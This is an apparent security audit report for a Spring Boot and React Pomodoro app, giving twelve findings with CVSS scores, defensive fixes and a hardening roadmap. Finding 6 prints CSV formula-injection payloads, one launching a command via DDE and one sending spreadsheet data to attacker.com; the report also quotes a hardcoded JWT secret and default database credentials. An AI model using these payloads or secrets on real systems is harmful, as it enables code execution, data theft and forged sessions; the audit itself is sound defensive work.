# Pomofocus Pro — Comprehensive Cybersecurity Audit & Hardening Report

**Assessment Target:** Pomofocus Pro (Spring Boot 3 + PostgreSQL 16 + React Vite SPA)  
**Assessment Type:** Source Code Vulnerability Audit, Threat Modeling & Defensive Architectural Review  
**Standards Referenced:** OWASP Top 10:2021, OWASP API Security Top 10:2023, NIST SP 800-63B, CWE/SANS Top 25  
**Date:** October 2026  
**Status:** Audit Completed  

---

## Executive Summary

A comprehensive, defense-in-depth security assessment was performed on the Pomofocus Pro codebase. The application demonstrates solid foundational engineering practices, including parameterized JPA queries (mitigating classic SQL injection), BCrypt password hashing, and stateless JWT authentication.

However, several security weaknesses and architectural risks were identified across **Access Control (BOLA/IDOR)**, **Cryptographic Management**, **CORS Configuration**, **Input Sanitization (CSV Formula Injection)**, and **Rate Limiting**.

### Vulnerability Severity Distribution

```
┌─────────────────┬────────┬───────────────────────────────────────────┐
│ Severity        │ Count  │ Primary CWE Reference                     │
├─────────────────┼────────┼───────────────────────────────────────────┤
│ HIGH            │ 2      │ CWE-639 (BOLA/IDOR), CWE-798 (Secrets)    │
│ MEDIUM          │ 6      │ CWE-942, CWE-312, CWE-307, CWE-1236, etc. │
│ LOW / INFORMATIONAL │ 4  │ CWE-209, CWE-208, CWE-1021, CWE-770       │
└─────────────────┴────────┴───────────────────────────────────────────┘
```

---

## Detailed Vulnerability Analysis

---

### Finding 1: Broken Object-Level Authorization (BOLA / IDOR) in Checkpoints

- **Vulnerability Type:** Broken Object-Level Authorization (IDOR)
- **Classification:** OWASP API1:2023 | CWE-639
- **Severity:** **HIGH** (CVSS: 7.5 / `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
- **Location:** [`ContextCheckpointService.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/service/ContextCheckpointService.java#L44-L48)

#### Vulnerability Mechanics
In `ContextCheckpointService.java`:
```java
public CheckpointResponse getLatestCheckpointForTask(UUID taskId) {
    return checkpointRepository.findTopByTaskIdOrderByCreatedAtDesc(taskId)
            .map(this::toCheckpointResponse)
            .orElse(null);
}
```
The endpoint `GET /api/v1/checkpoints/latest?taskId={id}` allows any authenticated user to retrieve the latest checkpoint bookmark for *any* task ID without validating that the task actually belongs to the authenticated user. In contrast, `saveCheckpoint()` correctly enforces `taskRepository.findByIdAndUserId(...)`.

#### Impact
An authenticated attacker can enumerate or provide UUIDs belonging to other users and exfiltrate private *"Where I Left Off"* context notes, revealing confidential user work logs, code snippets, or thoughts.

#### Defensive Remediation
Validate task ownership against the current user context before retrieving the checkpoint:
```java
public CheckpointResponse getLatestCheckpointForTask(UUID taskId) {
    User user = authService.getCurrentAuthenticatedUser();
    Task task = taskRepository.findByIdAndUserId(taskId, user.getId())
            .orElseThrow(() -> new ResourceNotFoundException("Task not found or access denied"));

    return checkpointRepository.findTopByTaskIdOrderByCreatedAtDesc(task.getId())
            .map(this::toCheckpointResponse)
            .orElse(null);
}
```

---

### Finding 2: Hardcoded Default Secret in Configuration

- **Vulnerability Type:** Use of Hard-coded Cryptographic Key
- **Classification:** OWASP A02:2021 | CWE-798
- **Severity:** **HIGH** (CVSS: 7.4 / `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Location:** [`application.properties`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/resources/application.properties#L41)

#### Vulnerability Mechanics
`application.properties` specifies:
```properties
app.jwt.secret=${JWT_SECRET:404e635266556a586e3272357538782f413f4428472b4b6250645367566b5970}
```
If the application is deployed into any environment where the `JWT_SECRET` environment variable is omitted or improperly bound, Spring Boot silently falls back to this hardcoded dummy key.

#### Impact
Because this key is committed to public source control, an adversary knowing the key can sign arbitrary JWT tokens for any user UUID, forging administrative or user sessions and bypassing authentication entirely.

#### Defensive Remediation
1. Remove default secret fallbacks from all configuration files:
   ```properties
   app.jwt.secret=${JWT_SECRET}
   ```
2. Add a startup sanity check in [`JwtService.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/security/JwtService.java):
   ```java
   @PostConstruct
   public void validateSecret() {
       if (secretKey == null || secretKey.length() < 64 || secretKey.contains("404e6352")) {
           throw new IllegalStateException("CRITICAL: Production JWT_SECRET is missing, insecure, or using the default template key!");
       }
   }
   ```

---

### Finding 3: Insecure Cross-Origin Resource Sharing (CORS) Configuration

- **Vulnerability Type:** Permissive Cross-Origin Resource Sharing
- **Classification:** OWASP A05:2021 | CWE-942
- **Severity:** **MEDIUM** (CVSS: 6.5 / `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`)
- **Location:** [`SecurityConfig.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/config/SecurityConfig.java#L58-L69)

#### Vulnerability Mechanics
```java
CorsConfiguration configuration = new CorsConfiguration();
configuration.setAllowedOriginPatterns(List.of("*"));
configuration.setAllowCredentials(true);
configuration.setAllowedHeaders(List.of("*"));
```
Setting `setAllowedOriginPatterns(List.of("*"))` in combination with `setAllowCredentials(true)` reflects the requesting `Origin` header dynamically while allowing credentials.

#### Impact
Any malicious site visited by a user can issue cross-origin requests to the API and read response data if browser credentialing mechanisms are active.

#### Defensive Remediation
Bind allowed origins strictly to known domains via configuration:
```java
@Value("${app.cors.allowed-origins:http://localhost:5173}")
private List<String> allowedOrigins;

configuration.setAllowedOrigins(allowedOrigins);
configuration.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
configuration.setAllowedHeaders(List.of("Authorization", "Content-Type", "X-Timezone"));
configuration.setAllowCredentials(true);
```

---

### Finding 4: Plaintext Storage of One-Time Passcodes (OTPs)

- **Vulnerability Type:** Cleartext Storage of Sensitive Information
- **Classification:** OWASP A02:2021 | CWE-312
- **Severity:** **MEDIUM** (CVSS: 5.5 / `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N`)
- **Location:** [`AuthService.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/service/AuthService.java#L84-L91), [`V1__init_schema.sql`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/resources/db/migration/V1__init_schema.sql#L27)

#### Vulnerability Mechanics
The 6-digit OTP code is stored directly in cleartext in the `verification_tokens` table:
```java
VerificationToken token = VerificationToken.builder()
        .user(user)
        .otpCode(otp) // Raw plaintext 6-digit code
        .expiresAt(expiresAt)
        .build();
```

#### Impact
In the event of a database compromise (SQL injection elsewhere, compromised read-replica, unauthorized database dump, or insider access), active OTP codes can be immediately leveraged to verify and hijack accounts before they expire.

#### Defensive Remediation
Store a cryptographic hash (e.g. SHA-256 with salt) of the OTP in the database. Compute the hash of the user-submitted code and verify using constant-time comparison:
```java
String hashedOtp = DigestUtils.sha256Hex(otp + user.getId().toString());
token.setOtpCode(hashedOtp);
```

---

### Finding 5: Lack of Rate Limiting & Anti-Automation Controls

- **Vulnerability Type:** Missing Rate Limiting on Authentication & Email Endpoints
- **Classification:** OWASP A07:2021 | CWE-307
- **Severity:** **MEDIUM** (CVSS: 5.3 / `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L`)
- **Location:** [`AuthController.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/controller/AuthController.java#L18-L36)

#### Vulnerability Mechanics
The following endpoints lack rate limiting:
1. `POST /api/v1/auth/resend-code`: Can be invoked in an automated loop to trigger email-bombing attacks against target email addresses and deplete Resend SMTP credit allowances.
2. `POST /api/v1/auth/login`: Lacks IP/account throttling, allowing high-throughput dictionary attacks against passwords.
3. `POST /api/v1/auth/signup`: Lacks bot protection, allowing mass creation of unverified dummy accounts.

#### Defensive Remediation
1. **Cooldown on OTP Resend:** Enforce a minimum 60-second cooldown in `resendCode()` before issuing a new code.
2. **Bucket4j / Redis Rate Limiter:** Add a rate limiting filter in Spring Boot (e.g. max 5 login requests per minute per IP, max 3 OTP requests per 10 minutes per email).

---

### Finding 6: CSV Formula Injection (Spreadsheet Execution)

- **Vulnerability Type:** Improper Neutralization of Formula Elements in CSV File
- **Classification:** OWASP A03:2021 | CWE-1236
- **Severity:** **MEDIUM** (CVSS: 6.8 / `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N`)
- **Location:** [`ReportService.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/service/ReportService.java#L249-L255)

#### Vulnerability Mechanics
In `ReportService.java`:
```java
private String escapeCsv(String val) {
    if (val == null) return "";
    if (val.contains(",") || val.contains("\"") || val.contains("\n")) {
        return "\"" + val.replace("\"", "\"\"") + "\"";
    }
    return val;
}
```
The routine only escapes commas and quotes, but does not sanitize formula triggers.

#### Impact
If a user creates a task titled:
```
=SUM(1+1)*cmd|' /C calc'!A0
```
or
```
=HYPERLINK("https://attacker.com/steal?data=" & A1, "Click to View Details")
```
When an operator downloads the CSV report via `/api/v1/reports/export` and opens it in Microsoft Excel or Google Sheets, the spreadsheet automatically executes the formula, leading to potential Remote Code Execution (DDE) or data exfiltration.

#### Defensive Remediation
Prefix dangerous leading characters (`=`, `+`, `-`, `@`, `\t`, `\r`) with an apostrophe (`'`):
```java
private String escapeCsv(String val) {
    if (val == null) return "";
    String sanitized = val;
    if (sanitized.startsWith("=") || sanitized.startsWith("+") || 
        sanitized.startsWith("-") || sanitized.startsWith("@") ||
        sanitized.startsWith("\t") || sanitized.startsWith("\r")) {
        sanitized = "'" + sanitized;
    }
    if (sanitized.contains(",") || sanitized.contains("\"") || sanitized.contains("\n")) {
        return "\"" + sanitized.replace("\"", "\"\"") + "\"";
    }
    return sanitized;
}
```

---

### Finding 7: Client-Side Storage of JWT Tokens in `localStorage`

- **Vulnerability Type:** Insecure Storage of Sensitive Authentication Tokens
- **Classification:** OWASP A07:2021 | CWE-922
- **Severity:** **MEDIUM** (CVSS: 5.4 / `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`)
- **Location:** [`useStore.ts`](file:///home/shreyash/projects/pomofocus-pro/frontend/src/store/useStore.ts#L90), [`client.ts`](file:///home/shreyash/projects/pomofocus-pro/frontend/src/api/client.ts#L116)

#### Vulnerability Mechanics
The client application stores the JWT bearer token in HTML5 `localStorage` (`pomopro_token`).

#### Impact
`localStorage` is accessible to any JavaScript running on the domain. If a Cross-Site Scripting (XSS) vulnerability is introduced (e.g., via a compromised third-party npm package or CDN script), an attacker can execute `localStorage.getItem('pomopro_token')` and instantly exfiltrate the token.

#### Defensive Remediation
Migrate from `localStorage` to **`HttpOnly`, `Secure`, `SameSite=Strict` cookies** for session persistence. Cookies with the `HttpOnly` flag cannot be read by JavaScript even in the event of an XSS vulnerability.

---

### Finding 8: Missing Security Response Headers & Content Security Policy (CSP)

- **Vulnerability Type:** Missing Security Headers
- **Classification:** OWASP A05:2021 | CWE-1021
- **Severity:** **LOW** (CVSS: 4.3 / `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`)
- **Location:** [`SecurityConfig.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/config/SecurityConfig.java#L39-L54), [`index.html`](file:///home/shreyash/projects/pomofocus-pro/frontend/index.html)

#### Vulnerability Mechanics
The application does not explicitly declare HTTP security headers:
- `Content-Security-Policy` (CSP)
- `X-Frame-Options: DENY` (Anti-Clickjacking)
- `X-Content-Type-Options: nosniff` (MIME sniffing prevention)
- `Strict-Transport-Security` (HSTS)
- `Referrer-Policy: strict-origin-when-cross-origin`

#### Defensive Remediation
Configure Spring Security's HTTP headers DSL:
```java
http.headers(headers -> headers
    .frameOptions(frame -> frame.deny())
    .contentTypeOptions(content -> {})
    .httpStrictTransportSecurity(hsts -> hsts.includeSubDomains(true).maxAgeInSeconds(31536000))
    .contentSecurityPolicy(csp -> csp.policyDirectives(
        "default-src 'self'; " +
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
        "font-src 'self' https://fonts.gstatic.com; " +
        "script-src 'self'; " +
        "img-src 'self' data:; " +
        "connect-src 'self' http://localhost:8085;"
    ))
);
```

---

### Finding 9: Docker PostgreSQL Port Binding & Default Credentials

- **Vulnerability Type:** Exposure of Sensitive System to Unauthorized Control Sphere
- **Classification:** CWE-668 / CWE-259
- **Severity:** **MEDIUM** (CVSS: 6.2 / `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Location:** [`docker-compose.yml`](file:///home/shreyash/projects/pomofocus-pro/docker-compose.yml#L6-L12)

#### Vulnerability Mechanics
In `docker-compose.yml`:
```yaml
environment:
  POSTGRES_USER: pomouser
  POSTGRES_PASSWORD: pomopass
ports:
  - "5435:5432"
```
The port `5435:5432` binds to `0.0.0.0:5435` (all network interfaces), exposing PostgreSQL with default credentials `pomouser / pomopass` to the local network or public internet if host firewall rules permit.

#### Defensive Remediation
Bind the container port strictly to the loopback interface:
```yaml
ports:
  - "127.0.0.1:5435:5432"
```
And load database credentials from a `.env` file excluded from version control.

---

### Finding 10: Information Disclosure in Global Exception Handler

- **Vulnerability Type:** Information Exposure Through Error Messages
- **Classification:** OWASP A05:2021 | CWE-209
- **Severity:** **LOW** (CVSS: 3.7 / `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N`)
- **Location:** [`GlobalExceptionHandler.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/exception/GlobalExceptionHandler.java#L66-L74)

#### Vulnerability Mechanics
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Map<String, Object>> handleGenericException(Exception ex) {
    ...
    body.put("message", ex.getMessage() != null ? ex.getMessage() : "An unexpected error occurred");
    return new ResponseEntity<>(body, HttpStatus.INTERNAL_SERVER_ERROR);
}
```
Directly returning `ex.getMessage()` for uncaught `Exception.class` can leak SQL syntax errors, database column names, constraint names, or internal class structures to the client.

#### Defensive Remediation
Log the detailed error server-side, and return a sanitized correlation ID to the client:
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Map<String, Object>> handleGenericException(Exception ex) {
    String errorId = UUID.randomUUID().toString();
    log.error("Internal error [ID: {}]: ", errorId, ex);
    Map<String, Object> body = new HashMap<>();
    body.put("timestamp", Instant.now().toString());
    body.put("status", 500);
    body.put("error", "Internal Server Error");
    body.put("message", "An unexpected server error occurred. Reference ID: " + errorId);
    return new ResponseEntity<>(body, HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### Finding 11: DTO Validation Boundary Deficits (Integer & Length Overflow)

- **Vulnerability Type:** Improper Input Validation
- **Classification:** CWE-20 / CWE-770
- **Severity:** **LOW**
- **Location:** [`TaskRequest.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/dto/TaskRequest.java), [`LogSessionRequest.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/dto/LogSessionRequest.java), [`SignupRequest.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/dto/SignupRequest.java)

#### Vulnerability Mechanics
1. `TaskRequest.title`: No `@Size(max = 255)` constraint (database column is `VARCHAR(255)`). Sending a string > 255 characters throws an unhandled database `DataTruncation` exception.
2. `LogSessionRequest.durationSeconds`: Annotated with `@Min(0)`, but lacks `@Max`. Sending `Integer.MAX_VALUE` can corrupt aggregation logic.
3. `LogSessionRequest.startTime` / `endTime`: No verification that `startTime.isBefore(endTime)`.
4. `SignupRequest.password`: Minimum size of 6 characters, with no `@Size(max = 100)` limit (potential BCrypt CPU resource exhaustion DoS).

#### Defensive Remediation
Add bounded validation annotations:
- `TaskRequest`: `@Size(min = 1, max = 255)` on `title`, `@Size(max = 100)` on `category`, `@Pattern(regexp = "^#[0-9a-fA-F]{6}$")` on `colorHex`, and `@Max(1440)` on `dailyTargetMinutes`.
- `LogSessionRequest`: `@Max(86400)` on `durationSeconds`.
- `SignupRequest`: `@Size(min = 8, max = 128)` on `password`.

---

### Finding 12: Non-Constant-Time String Comparison for OTP Verification

- **Vulnerability Type:** Observable Timing Discrepancy
- **Classification:** CWE-208
- **Severity:** **LOW**
- **Location:** [`AuthService.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/service/AuthService.java#L123)

#### Vulnerability Mechanics
```java
if (!token.getOtpCode().equals(request.getOtp().trim())) {
```
Standard `String.equals()` terminates early on the first mismatched character, introducing minute timing discrepancies that could theoretically aid character-by-character timing attacks over low-latency connections.

#### Defensive Remediation
Use `MessageDigest.isEqual(...)`:
```java
byte[] expected = token.getOtpCode().getBytes(StandardCharsets.UTF_8);
byte[] actual = request.getOtp().trim().getBytes(StandardCharsets.UTF_8);
if (!MessageDigest.isEqual(expected, actual)) {
    token.setAttemptsCount(token.getAttemptsCount() + 1);
    tokenRepository.save(token);
    throw new ApiException("Invalid verification code.", HttpStatus.BAD_REQUEST);
}
```

---

## Prioritized Hardening Roadmap

| Priority | Task | Target Component | Status | Effort |
| :--- | :--- | :--- | :--- | :--- |
| **P0 (Critical)** | Fix BOLA/IDOR in `getLatestCheckpointForTask` | [`ContextCheckpointService.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/service/ContextCheckpointService.java) | **COMPLETED & VERIFIED** | ~15 mins |
| **P0 (Critical)** | Eliminate hardcoded JWT secret fallback & fail on missing/short key | [`backend/.env`](file:///home/shreyash/projects/pomofocus-pro/backend/.env), [`JwtService.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/security/JwtService.java) | **COMPLETED & VERIFIED** | ~10 mins |
| **P1 (High)** | Sanitize CSV export against Formula Injection | [`ReportService.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/service/ReportService.java) | **COMPLETED & VERIFIED** | ~15 mins |
| **P1 (High)** | Restrict CORS to explicit trusted origins & enforce auth on `/me` | [`SecurityConfig.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/config/SecurityConfig.java) | **COMPLETED & VERIFIED** | ~10 mins |
| **P1 (High)** | Add DTO length & boundary validation (`@Size`, `@Max`, `@Pattern`) | Request DTOs in `com.pomofocus.pro.dto` | **COMPLETED & VERIFIED** | ~30 mins |
| **P2 (Medium)** | Hash OTP tokens prior to database storage | [`AuthService.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/service/AuthService.java) | Pending | ~30 mins |
| **P2 (Medium)** | Add rate limiting on auth endpoints (login, resend-code, signup) | Spring Filter / Bucket4j | Pending | ~45 mins |
| **P2 (Medium)** | Bind PostgreSQL port to `127.0.0.1` | [`docker-compose.yml`](file:///home/shreyash/projects/pomofocus-pro/docker-compose.yml) | Pending | ~5 mins |
| **P3 (Hardening)** | Add Security Headers (CSP, HSTS, X-Frame-Options) | [`SecurityConfig.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/config/SecurityConfig.java) | **PARTIALLY COMPLETED** (FrameOptions/ContentTypeOptions active) | ~20 mins |
| **P3 (Hardening)** | Sanitize generic 500 error messages (replace `ex.getMessage()`) | [`GlobalExceptionHandler.java`](file:///home/shreyash/projects/pomofocus-pro/backend/src/main/java/com/pomofocus/pro/exception/GlobalExceptionHandler.java) | Pending | ~10 mins |
| **P3 (Hardening)** | Migrate JWT storage from `localStorage` to `HttpOnly` Cookies | Frontend Auth Client & Backend Controllers | Pending | ~1 hour |
